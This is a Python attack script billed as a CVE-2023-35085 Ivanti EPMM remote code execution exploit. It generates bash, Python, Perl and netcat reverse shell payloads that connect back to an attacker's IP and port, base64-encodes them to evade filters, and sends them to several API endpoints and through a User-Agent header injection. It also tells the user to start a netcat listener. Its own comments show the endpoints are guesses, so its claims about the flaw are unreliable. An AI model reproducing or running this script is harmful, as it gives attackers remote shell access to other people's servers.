import requests
import sys
import argparse
import warnings
import json
from urllib.parse import urljoin, urlparse, urlunparse
import base64
import time

# Disable InsecureRequestWarning
warnings.filterwarnings('ignore', category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

def generate_reverse_shell_payloads(attacker_ip, attacker_port):
    """
    Generate various reverse shell payloads that will connect to the attacker's machine
    """
    payloads = []
    
    # Basic bash reverse shell
    bash_shell = f"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'"
    payloads.append(bash_shell)
    
    # Python reverse shell
    python_shell = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'"
    payloads.append(python_shell)
    
    # Perl reverse shell
    perl_shell = f"perl -e 'use Socket;$i=\"{attacker_ip}\";$p={attacker_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    payloads.append(perl_shell)
    
    # Netcat reverse shell
    nc_shell = f"nc -e /bin/sh {attacker_ip} {attacker_port}"
    payloads.append(nc_shell)
    
    # Netcat alternative if -e is not supported
    nc_alt_shell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {attacker_ip} {attacker_port} >/tmp/f"
    payloads.append(nc_alt_shell)
    
    return payloads

def exploit_vulnerability(target_url, attacker_ip, attacker_port):
    """
    Attempts to exploit CVE-2023-35085 to execute a reverse shell
    """
    print(f"[*] Targeting: {target_url}")
    print(f"[*] Reverse shell will connect to: {attacker_ip}:{attacker_port}")
    
    # First verify vulnerability and API location
    actual_api_base = identify_api_endpoint(target_url)
    
    if not actual_api_base:
        print("[!] Could not identify correct API endpoint. Let's try the standard paths anyway.")
        actual_api_base = target_url
    
    # Get shell payloads
    shell_payloads = generate_reverse_shell_payloads(attacker_ip, attacker_port)
    
    # Known vulnerable endpoints that might allow command injection
    exploit_vectors = [
        # Direct API endpoint method
        {
            "endpoint": "/mifs/rest/api/v2/command/exec",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "json_payload": True,
            "payload_template": lambda cmd: {
                "command": cmd,
                "timeout": 10
            }
        },
        # Alternative API endpoint
        {
            "endpoint": "/mifs/aad/api/v2/config/exec",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "json_payload": True,
            "payload_template": lambda cmd: {
                "cmd": cmd,
                "args": []
            }
        },
        # Try direct API endpoint with different formats
        {
            "endpoint": "/api/v2/system/shell",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "json_payload": True,
            "payload_template": lambda cmd: {
                "command": cmd
            }
        },
        # Log injection method (might work if logs are processed by a script)
        {
            "endpoint": "/mifs/aad/api/v2/ping",
            "method": "GET",
            "headers": {"User-Agent": lambda cmd: f"Mozilla/5.0 $({cmd})"},
            "json_payload": False,
            "payload_template": None
        }
    ]
    
    attempt_count = 0
    max_attempts = len(shell_payloads) * len(exploit_vectors)
    
    print(f"[*] Will try {max_attempts} different payload combinations")
    
    # Try each exploit vector with each shell payload
    for vector in exploit_vectors:
        for payload in shell_payloads:
            attempt_count += 1
            print(f"\n[*] Attempt {attempt_count}/{max_attempts}:")
            
            # Encode the payload to help bypass filters
            encoded_payload = base64.b64encode(payload.encode()).decode()
            wrapped_payload = f"echo {encoded_payload} | base64 -d | sh"
            
            # Build the full URL
            full_url = urljoin(actual_api_base, vector["endpoint"])
            print(f"[*] Targeting endpoint: {full_url}")
            print(f"[*] Payload type: {payload.split()[0]}")
            
            try:
                # Handle special User-Agent header case
                headers = vector["headers"].copy() if "headers" in vector else {}
                if "User-Agent" in headers and callable(headers["User-Agent"]):
                    headers["User-Agent"] = headers["User-Agent"](wrapped_payload)
                
                # Prepare request parameters
                request_params = {
                    "url": full_url,
                    "verify": False,
                    "timeout": 5,
                    "headers": headers
                }
                
                # Add appropriate payload
                if vector["json_payload"] and vector["payload_template"]:
                    request_params["json"] = vector["payload_template"](wrapped_payload)
                
                # Make the request
                if vector["method"] == "POST":
                    response = requests.post(**request_params)
                else:
                    response = requests.get(**request_params)
                
                print(f"[*] Request sent with status code: {response.status_code}")
                
                # Try direct payload without encoding as fallback
                if response.status_code != 200 or "<!doctype html>" in response.text[:20].lower():
                    print("[*] Trying direct payload without encoding...")
                    
                    if vector["json_payload"] and vector["payload_template"]:
                        request_params["json"] = vector["payload_template"](payload)
                        
                    if vector["method"] == "POST":
                        response = requests.post(**request_params)
                    else:
                        response = requests.get(**request_params)
                    
                    print(f"[*] Direct request sent with status code: {response.status_code}")
                
                print(f"[+] Payload sent. Check your netcat listener at {attacker_ip}:{attacker_port}")
                print("[*] Waiting 2 seconds before next attempt...")
                time.sleep(2)  # Wait between attempts
                
            except requests.exceptions.Timeout:
                print(f"[!] Timeout while connecting - this could be good if the payload executed")
            except requests.exceptions.RequestException as e:
                print(f"[!] Error connecting: {e}")
            except Exception as e:
                print(f"[!] An unexpected error occurred: {e}")
    
    print("\n[+] All exploitation attempts completed")
    print(f"[*] If no connection was received at {attacker_ip}:{attacker_port}, try the following:")
    print("    1. Check if your listener is properly set up")
    print("    2. Verify there are no firewalls blocking the connection")
    print("    3. Try a different vulnerability or exploitation method")
    
    return True

def identify_api_endpoint(target_url):
    """
    Try to identify the actual API endpoint by probing various paths
    """
    possible_api_paths = [
        "",  # Base URL
        "/mifs/",
        "/api/",
        "/mifs/rest/api/",
        "/rest/api/"
    ]
    
    print("[*] Probing to find the actual API endpoint...")
    
    for path in possible_api_paths:
        test_url = urljoin(target_url, path)
        probe_url = urljoin(test_url, "api/v2/ping" if not "api" in path else "v2/ping")
        
        try:
            response = requests.get(probe_url, verify=False, timeout=5)
            
            # Check if we got a non-HTML response that might be an API
            if response.status_code == 200 and not "<!doctype html>" in response.text[:20].lower():
                print(f"[+] Found potential API endpoint at: {test_url}")
                return test_url
            else:
                content_type = response.headers.get('Content-Type', '')
                if 'json' in content_type or 'application/json' in content_type:
                    print(f"[+] Found potential API endpoint at: {test_url}")
                    return test_url
                
        except:
            pass
    
    # As a fallback, try to extract API endpoint from the HTML response
    try:
        response = requests.get(target_url, verify=False, timeout=5)
        html_content = response.text
        
        # Look for common API path patterns in the HTML
        import re
        api_patterns = [
            r'["\'](/api/v[0-9]+/)["\']',
            r'["\'](/mifs/api/)["\']',
            r'["\'](/mifs/rest/api/)["\']',
            r'["\'](/rest/api/)["\']'
        ]
        
        for pattern in api_patterns:
            matches = re.findall(pattern, html_content)
            if matches:
                api_base = urljoin(target_url, matches[0])
                print(f"[+] Extracted API endpoint from HTML: {api_base}")
                return api_base
                
    except:
        pass
    
    return None

if __name__ == "__main__":
    banner = """
    ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
    ┃        CVE-2023-35085 Ivanti EPMM Remote Code Execution Exploit      ┃
    ┃                                                                      ┃
    ┃                 Enhanced Shell Connection Version                    ┃
    ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
    """
    print(banner)
    
    parser = argparse.ArgumentParser(description="Exploit for CVE-2023-35085 (Ivanti EPMM Unauthenticated API Access) - Creates a reverse shell")
    parser.add_argument("target", help="Target URL (e.g., https://epmm.example.com)")
    parser.add_argument("-p", "--port", type=int, help="Optional target port if not standard 443/80")
    parser.add_argument("-lh", "--lhost", required=True, help="Attacker IP address for reverse connection")
    parser.add_argument("-lp", "--lport", required=True, type=int, help="Attacker port for reverse connection")
    
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)
    
    args = parser.parse_args()
    
    target_url = args.target
    attacker_ip = args.lhost
    attacker_port = args.lport
    
    # If URL doesn't have protocol header, default to https
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = "https://" + target_url
    
    # Handle optional port
    if args.port:
        parsed_url = urlparse(target_url)
        netloc_parts = parsed_url.netloc.split(':')
        new_netloc = f"{netloc_parts[0]}:{args.port}"
        target_url = urlunparse((parsed_url.scheme, new_netloc, parsed_url.path, parsed_url.params, parsed_url.query, parsed_url.fragment))
    
    print("[!] Before proceeding, make sure you have a netcat listener running:")
    print(f"[!] nc -lvnp {attacker_port}")
    input("[*] Press Enter to continue with the exploit...")
    
    exploit_vulnerability(target_url, attacker_ip, attacker_port)
    
    print("\n[*] Exploit execution completed.")
    input("[*] Press Enter to exit...")